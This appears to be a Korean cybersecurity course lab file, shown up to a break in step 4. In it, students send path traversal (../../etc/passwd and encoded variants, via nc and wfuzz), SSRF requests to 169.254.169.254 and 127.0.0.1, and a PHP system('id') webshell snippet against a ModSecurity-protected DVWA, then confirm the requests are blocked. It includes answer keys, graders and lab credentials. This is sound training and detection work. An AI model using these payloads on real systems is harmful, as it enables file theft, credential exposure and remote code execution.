lab_id: standalone-attack-week07
title: "SSRF·Path Traversal·악성 업로드 (A10·A05·A03) vs 탐지"
version: standalone-attack
course: attack
week: 7
description: |
  입력으로 "닿으면 안 될 곳"에 닿는 세 공격을 공격자(PTES) 관점에서 직접 발사한다 —
  경로순회(Path Traversal, A03/A05: ../로 파일시스템 경계를 넘어 임의 파일 읽기),
  SSRF(A10: 서버를 시켜 169.254.169.254 등 내부 자원에 대신 요청), 악성 콘텐츠/업로드
  (A03: <?php system('id'); ?> 류 PHP 코드 주입 → webshell/RCE). 셋의 공통 원인은 하나 —
  신뢰 경계에서 입력 검증이 빠진 것. 대상은 el34 의 dvwa(ModSec 차단 모드)이며, 경로순회는
  CRS 930·명령주입은 932·PHP 주입은 933 룰군에 잡혀 403 으로 차단된다. SSRF 는 정상 요청과
  형태가 비슷해 항상 깔끔히 403 으로 막히지는 않으므로(탐지가 까다로움) "시도와 흔적"을
  관찰한다. 공격은 외부 공격자 VM 192.168.0.202(att/1)에서 공인 진입 192.168.0.161로 — `ssh att@192.168.0.202`
  (비번 1)로 접속해 수행하고, 방어 로그 확인은 WAF 장비 `ssh ccc@10.20.32.80`(비번 1)에서 modsec_audit/access 로그로.
  인가된 학습 환경 안에서만 시도한다. (개념·룰군 매핑은 lecture §1~§6 참고.)
difficulty: hard
duration_minutes: 180
prerequisites:
  - "W01–W06 통과 (정찰·API/JWT·SQLi·XSS·접근제어 기법 숙지)"
  - "공격 VM ssh att@192.168.0.202 + 방어 웹 장비 ssh ccc@10.20.32.80 (비번 1)"
  - "lecture §1(경로순회) §2(명령·PHP 주입) §3(SSRF) §5(ModSec 탐지) 통독"
  - "신뢰 경계(trust boundary) 개념과 '입력으로 경계 넘기' 한 줄 통찰 이해(lecture §0.5)"
objectives:
  - "경로순회(../../etc/passwd)를 평문·URL 인코딩 두 형태로 발사하고 ModSec 930에 403 차단됨을 확인"
  - "SSRF(169.254.169.254 메타데이터/내부 URL)로 서버를 시켜 내부 자원에 닿으려는 시도를 발사하고 흔적 관찰"
  - "PHP 코드 주입(<?php system('id'); ?>)으로 webshell/RCE 시도 → ModSec 933에 403 차단 확인"
  - "web 의 modsec_audit.log 에서 930(LFI)·931(RFI)·932(RCE)·933(PHP) 룰군과 949110 anomaly 차단을 읽어 공격 유형에 매핑"
  - "세 공격의 영향(파일읽기→내부망/클라우드 키→RCE)과 근본 방어(입력 불신+allowlist+정규화)를 보고서로 정리"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 점검 — 공격 대상(dvwa) 도달성 확인
      ### 개념 (왜 이걸 하나)
      모의침투(PTES)의 익스플로잇 직전 단계는 "표적이 살아 있고 닿는가" 확인이다. 페이로드를
      쏘기 전에 대상이 응답하는지부터 본다. 이번 주 대상은 **dvwa**(`dvwa.el34.lab`)이며,
      el34 에서 dvwa 는 **ModSec 차단 모드**(`SecRuleEngine On`)라 경로순회·PHP 주입이 403 으로
      막히는 vhost 다(juice 는 DetectionOnly 라 탐지만 하고 200 통과 — 그래서 "차단 확인"은 dvwa).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) 차단형 dvwa 도달성 — 응답코드만(페이로드 발사 전 표적 생존 확인)
      whatweb -a1 http://dvwa.el34.lab/
      ```
      > 💡 브라우저 주소창에 `http://dvwa.el34.lab/` 를 열면 dvwa 화면(또는 로그인 리다이렉트)이 뜬다 —
      > 이 단계는 도달성만 보므로 코드만 필요해 `-o /dev/null -w`(본문 버리고 코드만)로 확인한다.
      - `-o /dev/null`(본문 버림)+`-w '%{http_code}'`(응답 코드만), 자연 URL `http://dvwa.el34.lab/`(호스트명이 vhost 지정). attacker → `http://dvwa.el34.lab/`.

      ## ✅ 합격 기준
      `dvwa` 출력 시 통과. **근거:** dvwa=<코드>(예: 200/302/403 무엇이든)가 떨어지면 도달 정상 —
      응답이 없으면 라우팅·컨테이너 문제이니 이후 단계 진행 전 점검한다.
    hint: '도달성'
    category: survey
    points: 10
    answer: |
      # 1) 차단형 dvwa 도달성 — 응답코드만(페이로드 발사 전 표적 생존 확인)
      ssh att@192.168.0.202 'whatweb -a1 http://dvwa.el34.lab/'
    answer_detail: "입력 기반 공격의 대상 = dvwa(차단 모드 vhost, ModSec CRS 930/932/933 탐지). 페이로드 발사 전 표적 생존·도달성을 확인하는 정찰 마무리 단계. HTTP 응답 코드가 돌아오면(코드 종류 무관) 도달 정상으로 판정한다."
    expected_output: |
      dvwa=302
    verify:
      type: output_contains
      expect: 'dvwa'
      field: stdout
      semantic:
        intent: "대상 점검"
        success_criteria: ["도달"]
        acceptable_methods: ["**[OSS] nc raw HTTP / whatweb (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 경로순회(Path Traversal) — 파일시스템 경계 넘기 (A03/A05)
      ### 개념 (왜 이걸 하나)
      `../` 는 "상위 디렉토리로 한 단계 이동"을 뜻한다. 앱이 사용자 입력으로 파일 경로를 만들면
      (`/var/www/uploads/<입력>`), 입력에 `../../etc/passwd` 를 넣어 의도된 폴더 밖 임의 파일을
      읽을 수 있다(`/etc/passwd` = 리눅스 계정 목록). 이것이 경로순회다. 단순히 문자열 `../` 만
      막는 방어는 **URL 인코딩 우회**(`.`=`%2e`, `/`=`%2f` → `%2e%2e%2f`)로 뚫린다. 그래서 두
      형태(평문 + 인코딩)를 함께 쏴서, ModSec 이 **정규화(canonicalization)** 로 인코딩 우회까지
      막는지 확인한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) 경로순회 평문 — ../../etc/passwd로 파일시스템 경계 탈출 시도
      echo "pt=$(echo -en 'GET /?q=../../etc/passwd HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
      # 2) 경로순회 URL 인코딩 — %2e%2e%2f(.,/를 인코딩)로 단순 필터 우회 시도
      echo "enc=$(echo -en 'GET /?q=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
      # 3) 여러 인코딩·우회 변종을 자동으로 — wfuzz(웹 퍼저)로 traversal payload 목록을 한 번에 발사
      printf '../../etc/passwd\n%%2e%%2e%%2fetc%%2fpasswd\n....//....//etc/passwd\n..%%2f..%%2fetc%%2fpasswd\n' > /tmp/pt.txt
      wfuzz -w /tmp/pt.txt -u 'http://dvwa.el34.lab/?q=FUZZ' 2>&1 | sed -r 's/\x1b\[[0-9;]*m//g' | grep -iE 'Payload|403'
      rm -f /tmp/pt.txt
      ```
      손으로 2개(평문·인코딩)를 던진 것을 `wfuzz`(웹 퍼저)는 여러 우회 변종(`%2e`·`....//`·`..%2f`)을 목록으로
      한 번에 발사한다 — 결과가 **모두 403** 이면 CRS 930 이 정규화 후 traversal 클래스 전체를 막는다는 뜻이다.
      > 💡 **화면으로 확인:** 브라우저에서 `http://dvwa.el34.lab/?q=../../etc/passwd` 를 열면 **403 페이지**가 뜬다
      > (파일 내용이 아니라 차단 화면 — 코드만 필요하면 `-o /dev/null -w`).

      ## ✅ 합격 기준
      `403` 출력 시 통과. **근거:** 평문·인코딩 둘 다 403 으로 차단되면 통과 — CRS 930 룰군(LFI/Path
      Traversal)이 `../`·`/etc/passwd` 패턴을 잡고 949110 anomaly 가 최종 차단(둘 다 403=정규화가 우회 무력화).
    hint: '../../etc/passwd → 403'
    category: manipulation
    points: 12
    answer: |
      # 1) 경로순회 평문 — ../../etc/passwd로 파일시스템 경계 탈출 시도
      echo "pt=$(ssh att@192.168.0.202 "echo -en 'GET /?q=../../etc/passwd HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")"
      # 2) 경로순회 URL 인코딩 — %2e%2e%2f(.,/를 인코딩)로 단순 필터 우회 시도
      echo "enc=$(ssh att@192.168.0.202 "echo -en 'GET /?q=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")"
      # 3) wfuzz로 traversal 변종 목록을 한 번에 발사(자동 퍼징)
      ssh att@192.168.0.202 "printf '../../etc/passwd\n%%2e%%2e%%2fetc%%2fpasswd\n....//....//etc/passwd\n..%%2f..%%2fetc%%2fpasswd\n' > /tmp/pt.txt; wfuzz -w /tmp/pt.txt -u 'http://dvwa.el34.lab/?q=FUZZ' 2>&1 | sed -r 's/\x1b\[[0-9;]*m//g' | grep -iE 'Payload|403'; rm -f /tmp/pt.txt"
    answer_detail: "경로순회(Path Traversal, A03/A05) = ../로 의도된 디렉토리를 탈출해 임의 파일(/etc/passwd 등)을 읽는 공격. el34 dvwa(차단 모드)에서 ModSec CRS 930xxx(LFI/Path Traversal) 룰군이 ../, /etc/passwd 패턴을 잡아 403. 평문이든 URL 인코딩(%2e%2e%2f)이든 ModSec 이 검사 전 정규화(canonicalization)하므로 같은 룰에 걸려 둘 다 403. 손으로 2개를 던진 뒤 wfuzz(웹 퍼저)로 여러 우회 변종(%2e·....//·..%2f)을 목록으로 한 번에 발사하면 전부 403 — CRS 930 이 traversal 클래스 전체를 막음을 자동으로 확인한다(인코딩 우회 무력화)."
    expected_output: |
      pt=403
      enc=403
      ID           Response   Lines    Word     Chars     Payload
      000000001:   403        9 L      28 W     278 Ch    "../../etc/passwd"
      000000002:   403        9 L      28 W     278 Ch    "%2e%2e%2fetc%2fpasswd"
      000000003:   403        9 L      28 W     278 Ch    "....//....//etc/passwd"
      000000004:   403        9 L      28 W     278 Ch    "..%2f..%2fetc%2fpasswd"
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: "Path Traversal 시도(수동 2 + wfuzz 자동 변종) + 930 차단"
        success_criteria: ["../etc/passwd 평문·인코딩", "wfuzz 변종 퍼징", "전부 403(930)"]
        acceptable_methods: ["**[OSS] nc raw HTTP + wfuzz 퍼징 (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 SSRF(Server-Side Request Forgery) — 내부 네트워크 경계 넘기 (A10)
      ### 개념 (왜 이걸 하나)
      SSRF 의 핵심은 **요청의 주체가 서버**라는 점이다. 공격자 PC 는 방화벽 때문에 내부망에
      직접 못 닿지만, 서버는 내부망 안에 있다. 입력 URL로 `http://169.254.169.254/`(클라우드 VM
      내부에서만 닿는 **메타데이터 엔드포인트** — IAM 키 노출처)나 `http://127.0.0.1:9100/`(로컬
      관리 서비스)을 주면, 서버가 대신 그곳에 요청을 보내 응답을 공격자에게 돌려준다 = 방화벽 우회.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) SSRF — 서버가 클라우드 메타데이터(169.254.169.254=IAM 키)에 대신 요청하게 유도
      echo "ssrf=$(echo -en 'GET /?q=http://169.254.169.254/latest/meta-data/ HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
      # 2) SSRF — 로컬 관리포트(127.0.0.1:9100)에 대신 요청하게 유도
      echo "localhost=$(echo -en 'GET /?q=http://127.0.0.1:9100/ HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
      ```
      두 요청은 **주체가 서버**라는 점이 핵심이다 — 공격자 PC 는 방화벽 때문에 169.254.169.254·127.0.0.1 에
      직접 못 닿지만, 서버는 내부에 있어 대신 요청한다. SSRF 는 정상 URL 과 형태가 비슷해 항상 403 으로
      깔끔히 막히진 않으므로(그래서 A10 별도 항목) "시도와 흔적"을 관찰한다.
      > 💡 **화면으로 확인:** 브라우저에서 `http://dvwa.el34.lab/?q=http://169.254.169.254/latest/meta-data/` 를
      > 열어 응답(차단 페이지/에러/빈 응답)을 직접 본다 — el34 는 실제 클라우드가 아니라 진짜 IAM 키는 안 나온다(형태·흔적 학습).

      ## ✅ 합격 기준
      `ssrf` 출력 시 통과. **근거:** SSRF 시도(메타데이터/내부 URL)가 발사되고 흔적이 남으면 통과 —
      SSRF 는 정상 URL 과 형태가 비슷해 항상 403 으로 막히지 않으므로(A10 별도 항목 이유) 판정은
      "ssrf 시도"로 한다(el34 는 실제 클라우드가 아니라 진짜 IAM 키는 안 나온다 — 형태·흔적 학습).
    hint: 'url=169.254.169.254 메타데이터'
    category: manipulation
    points: 12
    answer: |
      # 1) SSRF — 서버가 클라우드 메타데이터(169.254.169.254=IAM 키)에 대신 요청하게 유도
      echo "ssrf=$(ssh att@192.168.0.202 "echo -en 'GET /?q=http://169.254.169.254/latest/meta-data/ HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")"
      # 2) SSRF — 로컬 관리포트(127.0.0.1:9100)에 대신 요청하게 유도
      echo "localhost=$(ssh att@192.168.0.202 "echo -en 'GET /?q=http://127.0.0.1:9100/ HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")"
    answer_detail: "SSRF(A10) = 사용자가 준 URL로 서버가 대신 요청 → 공격자가 직접 못 닿는 내부망/클라우드 메타데이터(169.254.169.254 = IAM 키)/로컬 관리포트에 접근. 요청 주체가 내부 서버라 방화벽을 무력화한다. el34 ModSec/CRS 는 내부 IP·위험 스킴 패턴을 일부 탐지하나 정상 요청과 비슷해 확정 403 은 아니다 → 판정은 'SSRF 시도 발사'로 한다. 근본 방어 = URL allowlist + 내부/링크-로컬 IP(127/10.x/169.254) 차단 + 해석된 최종 IP 기준 검사."
    expected_output: |
      ssrf=403
      localhost=403
    verify:
      type: output_contains
      expect: 'ssrf'
      field: stdout
      semantic:
        intent: "SSRF 내부 자원 시도"
        success_criteria: ["메타데이터/내부 URL 시도", "탐지/차단"]
        acceptable_methods: ["**[OSS] SSRF URL 시도 (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 악성 콘텐츠 — PHP 코드 주입 (A03, webshell/RCE 의 씨앗)
      ### 개념 (왜 이걸 하나)
      `<?php system('id'); ?>` 는 PHP 가 OS 명령 `id`(현재 권한 출력)를 실행하게 하는 코드다.
      이런 코드 조각을 입력·파일로 서버에 심어 web 으로 호출해 명령을 받는 악성 스크립트가
      **webshell** 이고, 한 번 심기면 browser 만으로 서버에 명령을 내리는 **RCE(원격 코드 실행) →
      서버 장악**이 된다. 흔한 침투 경로는 **악성 파일 업로드**(검사가 허술하면 .php 업로드, 우회는
      .phtml/.php5·MIME 위조·polyglot). 여기서는 그 코드 주입이 WAF 에 어떻게 잡히는지 본다.
